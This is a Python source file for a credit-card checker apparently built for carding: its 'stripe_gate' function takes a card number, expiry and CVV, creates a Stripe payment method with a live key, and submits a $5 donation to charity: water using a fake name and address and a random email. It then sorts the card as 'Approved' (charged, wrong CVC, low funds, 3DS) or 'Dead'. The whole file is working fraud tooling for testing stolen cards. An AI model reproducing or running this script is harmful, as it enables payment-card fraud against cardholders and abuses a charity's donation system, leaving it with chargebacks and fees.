from httpx import AsyncClient
from utilsdf.functions import capture, random_email


async def stripe_gate(cc, month, year, cvv):
    mail = random_email()
    async with AsyncClient(
        follow_redirects=True, verify=False, timeout=30
    ) as session:
        # 1. Visit donation page
        await session.get("https://www.charitywater.org/")

        # 2. Create Stripe payment method
        h2 = {
            "Host": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
        }

        p2 = (
            f"type=card"
            f"&billing_details[address][postal_code]=10027"
            f"&billing_details[address][city]=New+York"
            f"&billing_details[address][country]=US"
            f"&billing_details[address][line1]=118+W+132nd+St"
            f"&billing_details[email]={mail}"
            f"&billing_details[name]=John+Smith"
            f"&card[number]={cc}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={month}"
            f"&card[exp_year]={year}"
            f"&guid=N/A&muid=N/A&sid=N/A"
            f"&payment_user_agent=stripe.js%2Fecd86a62ca%3B+stripe-js-v3%2Fecd86a62ca%3B+card-element"
            f"&time_on_page=42000"
            f"&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"
        )

        r2 = await session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=h2,
            data=p2,
        )
        t2 = r2.text
        pm = capture(t2, '"id": "', '"')
        error_msg = capture(t2, '"message": "', '"')

        if not pm or ("error" in t2.lower() and "pm_" not in t2):
            if error_msg:
                return "Dead! ❌", error_msg
            return "Dead! ❌", "Payment method creation failed"

        # 3. Submit $5 donation
        h3 = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.charitywater.org",
            "referer": "https://www.charitywater.org/",
        }

        p3 = (
            f"country=us"
            f"&payment_intent%5Bemail%5D={mail}"
            f"&payment_intent%5Bamount%5D=500"
            f"&payment_intent%5Bcurrency%5D=usd"
            f"&payment_intent%5Bpayment_method%5D={pm}"
            f"&disable_existing_subscription_check=false"
            f"&donation_form%5Bamount%5D=500"
            f"&donation_form%5Banonymous%5D=true"
            f"&donation_form%5Bcomment%5D="
            f"&donation_form%5Bdisplay_name%5D="
            f"&donation_form%5Bemail%5D={mail}"
            f"&donation_form%5Bname%5D=John"
            f"&donation_form%5Bsurname%5D=Smith"
            f"&donation_form%5Bpayment_gateway_token%5D="
            f"&donation_form%5Bpayment_monthly_subscription%5D=false"
            f"&donation_form%5Bsetup_intent_id%5D="
            f"&donation_form%5Bsubscription_period%5D="
            f"&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_1%5D=118+W+132nd+St"
            f"&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcity%5D=New+York"
            f"&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcountry%5D=US"
            f"&donation_form%5Bmetadata%5D%5Baddress%5D%5Bzip%5D=10027"
            f"&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false"
        )

        r3 = await session.post(
            "https://www.charitywater.org/donate/stripe",
            headers=h3,
            data=p3,
        )
        t3 = r3.text
        msg = capture(t3, '"message":"', '"')

        if "requiresAction" in t3:
            status = "Approved! ✅ -» 3DS"
            msg = "3D Secure Required"
        elif r3.status_code == 200 or r3.status_code == 302:
            status = "Approved! ✅ -» charged!"
            msg = "Success -» $5"
        elif "security code is incorrect" in str(msg):
            status = "Approved! ✅ -» ccn"
        elif "insufficient funds" in str(msg).lower() or "funds" in str(msg).lower():
            status = "Approved! ✅ -» low funds"
        else:
            status = "Dead! ❌"

        return status, msg
